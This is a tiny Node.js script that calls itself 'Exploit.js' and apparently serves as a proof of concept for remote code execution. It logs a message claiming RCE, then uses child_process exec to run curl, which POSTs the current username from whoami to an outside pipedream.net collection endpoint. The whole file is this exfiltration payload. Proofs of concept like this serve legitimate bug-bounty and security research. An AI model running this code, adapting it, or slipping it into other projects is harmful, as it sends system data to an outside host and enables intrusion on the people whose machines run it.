const { exec } = require('child_process');
console.log("🔥 Exploit.js executed! This confirms RCE potential.");
exec('curl -X POST -d "PWNED=$(whoami)" https://eorcrwihz26p9fd.m.pipedream.net')

